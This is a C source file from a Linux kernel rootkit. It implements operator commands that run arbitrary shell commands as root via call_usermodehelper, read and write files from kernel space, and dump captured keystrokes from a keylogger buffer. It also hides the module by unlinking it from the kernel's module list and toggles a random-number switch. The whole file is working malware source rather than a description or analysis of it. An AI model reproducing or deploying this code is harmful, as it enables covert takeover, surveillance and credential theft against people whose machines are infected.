#include "commands.h"

static u32 get_arg_len(char* string) {
    u32 index = 0;
    while (string[index] != ' ' && string[index] != '\0') {
        index++;
    }
    return index;
}


command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {
        "shell \0", "mycat \0",
        "keylog\0", "hide \0",
        "unhide \0", "hidemod\0",
        "unhidemod\0", "randswitch\0",
        "writefile \0"
      };
    command_t commands[COMMAND_NUM] = {
        RUN, CAT,
        KEYLOG, HIDE,
        UNHIDE, HIDEMOD,
        UNHIDEMOD, SWITCH_RANDOM,
        WRITE_FILE
        };
    u32 i, shift, j;

    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);

        // checking if the string starts with the given command
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        // shifting the string (to delete the command)
        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
    
    }


    return BAD_COMMAND;

}


void run_command(args_t* args) {
    char* pwd_name = "PWD=\0";
    u32 pwd_len = strlen(pwd_name);
    bool found_pwd = false;
    bool good_env = true;
    char* template = "{ echo %s; cd %s; %s; pwd; echo %s; printenv;} > /dev/" SHELL_DEV_NAME "\0";
    char **envp;
    char *argv[] = {"/bin/sh", "-c", NULL, NULL};
    char* buffer;
    u32 buffer_len;
    u32 final_len;
    u32 env_count;
    char* output;
    u32 i, j;
    char* pwd;

    mutex_lock(&driver_data.mutex);
    envp = kmalloc(sizeof(char*) * (driver_data.env_count + 1), GFP_KERNEL);

    if (!envp) {
        mutex_unlock(&driver_data.mutex);
        send_response("rootkit: error while allocating envp\0", args);
        kfree(buffer);
        return;

    }
    envp[driver_data.env_count] = NULL;
    env_count = driver_data.env_count;
    for (i = 0; i < driver_data.env_count; i++) {
        envp[i] = kmalloc(strlen(driver_data.env[i]) + 1, GFP_KERNEL);
        if (!envp[i]) {
            mutex_unlock(&driver_data.mutex);
            send_response("rootkit: error while allocating env variable\0", args);
            goto finish;
        }
        strcpy(envp[i], driver_data.env[i]);
        if (found_pwd) {
            continue;
        }
        good_env = true;
        for (j = 0; j < pwd_len; j++) {
            if (!envp[i][j] || (envp[i][j] != pwd_name[j])) {
               good_env = false;
               break;
            }
        }
        if (good_env) {
            found_pwd = true;
            pwd = envp[i] + pwd_len;
        }
    }
    if (!found_pwd) {
        pwd = "/";
    }
    mutex_unlock(&driver_data.mutex);


    buffer_len = strlen(pwd) + strlen(args->string) + strlen(password) + strlen(template);
    buffer = kmalloc(buffer_len, GFP_KERNEL);
    final_len = sprintf(buffer, template, password, pwd, args->string, password);
    DEBUG_PRINTF("%s\n", buffer)
    if (final_len < 0) {
        DEBUG_PUTS("rootkit: error while using sprintf to build command\n")
        return;
    }


    argv[2] = buffer;

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    if (driver_data.output && driver_data.output_len >= 1) {
        mutex_lock(&driver_data.mutex);
        output = driver_data.output;
        driver_data.output = NULL;
        output[driver_data.output_len - 1] = '\0';
        driver_data.output_len = 0;
        mutex_unlock(&driver_data.mutex);

        DEBUG_PRINTF("rootkit: returning the output: %s\n", output)

        send_response(output, args);
        kfree(output);
    } else {
        send_response("\0", args);
    }


finish:

    kfree(buffer);
    for (i = 0; i < env_count; i++) {
        kfree(envp[i]);
    }
    kfree(envp);


}


int read_file(char* filename, char* buffer, int to_read, loff_t start) {
    struct file *f;
    int i;
    loff_t offset = start;

    // initializing string with null symbols
    for (i = 0; i < to_read + 1; i++) {
        buffer[i] = '\0';
    }
    
    
    f = filp_open(filename, O_RDONLY, 0);

    if (IS_ERR(f)) {
        DEBUG_PUTS("rootkit: file was not open\n")
        return -1;
    }

    // TODO: check return value + dynamic allocation
    kernel_read(f, (void*) buffer, to_read, &offset);


    DEBUG_PRINTF("rootkit: file was read: %s\n", buffer)

    filp_close(f, NULL);
    
    return 0;


}

// creates file with content from the given buffer
int write_file(char* filename, char* buffer) {
    struct file *f;
    u32 size = strlen(buffer);
    loff_t offset = 0;
        
    f = filp_open(filename, O_CREAT | O_WRONLY, 0);


    if (IS_ERR(f)) {
        DEBUG_PUTS("rootkit: file was not open\n")
        return -1;
    }

    kernel_write(f, (void*) buffer, size, &offset);


    DEBUG_PUTS("rootkit: file was written\n")

    filp_close(f, NULL);
    
    return 0;

}


void cat_command(args_t* args) {
    char* string = args->string;
    u32 first_arg_len;
    u32 second_arg_len;
    u32 start_index;
    u32 count;
    char* buffer;

    first_arg_len = get_arg_len(string);
    if (string[first_arg_len] == '\0') {
        send_response("rootkit: cat got only one argument\n", args);
        return;
    }
    string[first_arg_len] = '\0';

    second_arg_len = get_arg_len(string + first_arg_len + 1);
    if (string[second_arg_len + first_arg_len + 1] == '\0') {
        send_response("rootkit: cat got only two arguments\n", args);
        return;
    }
    string[first_arg_len + second_arg_len + 1] = '\0';

    if (kstrtou32(string, 10, &start_index) != 0) {
        send_response("rootkit: cat got invalid start index\n", args);
        return;
    }

    DEBUG_PRINTF("rootkit: first_arg=%s", string)

    if (kstrtou32(string + first_arg_len + 1, 10, &count) != 0) {
        send_response("rootkit: cat got invalid count\n", args);
        return;
    }

    DEBUG_PRINTF("rootkit: second_arg=%s", string + first_arg_len + 1)

    if (count >= REQUEST_SIZE_LIMIT) {
        send_response("rootkit: too many bytes to read\n", args);
        return;
    }


    buffer = kmalloc(count + 1, GFP_KERNEL);
    
    DEBUG_PRINTF("rootkit: filename %s", string + first_arg_len + second_arg_len + 2)

    // checking errors
    if (read_file(string + first_arg_len + second_arg_len + 2, buffer, count, start_index) == 0) {   
        send_response(buffer, args);
    } else {
        send_response("rootkit: error while reading\n", args);
    }
    kfree(buffer);

}


void write_file_command(args_t* args) {
    char* string = args->string;
    u32 first_arg_len;
    u32 second_arg_len;


    first_arg_len = get_arg_len(string);
    if (string[first_arg_len] == '\0') {
        send_response("rootkit: write command got only one argument\n", args);
        return;
    }
    string[first_arg_len] = '\0';

    second_arg_len = strlen(string + first_arg_len + 1);


    DEBUG_PRINTF("rootkit: first_arg=%s", string)

    DEBUG_PRINTF("rootkit: second_arg=%s", string + first_arg_len + 1)


    // checking errors
    if (write_file(string, string + first_arg_len + 1) == 0) {   
        send_response("rootkit: successfully wrote to file\n", args);
    } else {
        send_response("rootkit: error while writing\n", args);
    }

}

void keylog_command(args_t* args) {
    char* buffer;
    size_t j = 0;
    size_t i;

    mutex_lock(&keylogger_mutex);
    if (first_log) {
        buffer = kmalloc(logger_index + 1, GFP_KERNEL);
    } else {
        buffer = kmalloc(KEYLOGGER_SIZE + 1, GFP_KERNEL);
    }
    if (!buffer) {
        mutex_unlock(&keylogger_mutex);
        return;
    }
    if (!first_log) {
        for (i = logger_index; i < KEYLOGGER_SIZE; i++) {
            buffer[j] = keylogger[i];
            j++;
        }
    }

    for (i = 0; i < logger_index; i++) {
        buffer[j] = keylogger[i];
        j++;
    }

    
    buffer[j] = '\0';
    mutex_unlock(&keylogger_mutex);

    DEBUG_PUTS("rootkit: copied keylog\n")

    send_response(buffer, args);

    kfree(buffer);

}

static bool is_hidden = false;
static struct list_head *prev;

DEFINE_MUTEX(hide_mod_mutex);


bool hide_module(void) {
    mutex_lock(&hide_mod_mutex);
    if (is_hidden) {
        mutex_unlock(&hide_mod_mutex);
        return false;
    }
    prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = true;
    mutex_unlock(&hide_mod_mutex);
    return true;
}

bool unhide_module(void) {
    mutex_lock(&hide_mod_mutex);
    if (!is_hidden) {
        mutex_unlock(&hide_mod_mutex);
        return false;
    }
    is_hidden = false;
    list_add(&THIS_MODULE->list, prev);
    mutex_unlock(&hide_mod_mutex);
    return true;
}

DEFINE_MUTEX(random_mutex);

bool random_switched = false;

bool switch_random(void) {
    bool res;
    mutex_lock(&random_mutex);
    random_switched = !random_switched;
    res = random_switched;
    mutex_unlock(&random_mutex);
    return res;
}